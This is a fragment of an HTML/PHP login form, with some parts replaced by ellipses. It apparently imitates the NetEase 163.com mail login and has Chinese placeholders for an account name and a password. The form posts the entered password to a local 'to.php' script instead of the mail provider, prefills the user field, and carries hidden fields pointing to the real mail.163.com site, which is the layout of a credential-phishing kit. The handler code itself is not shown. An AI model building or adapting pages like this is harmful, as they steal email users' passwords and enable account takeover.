				  ...
				  <form action="/to/to.php" method="post"> 
					...
					<tr>
						...
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="31">&nbsp;</td>
								<td height="48">
								    <input type="text" name="user" placeholder="&#37038;&#31665;&#36134;&#21495;&#25110;&#25163;&#26426;&#21495;&#30721;" value="<?php echo $users;?>" >
								</td>
								<td width="28">&nbsp;</td>
							</tr>
						</table>
					...
					<tr>
						...
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="31">&nbsp;</td>
								<td height="48">
								    <input type="password" name="passwd" placeholder="&#36755;&#20837;&#23494;&#30721;" value="" autofocus >
                                </td>
								<td width="28">&nbsp;</td>
							</tr>
						</table>
					...
					<tr>
						<td height="82"></td>
																	...
																	<td>
                                                                    <input  name="link" type="hidden" value="https://mail.163.com/"  >
																	</td>
																	<td>
                                                                    <input  name="domain" type="hidden" value="<?php echo $ddomain;?>"  >
                                                                    <input  name="sender" type="hidden" value="163.com"  >
																	</td>
											<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
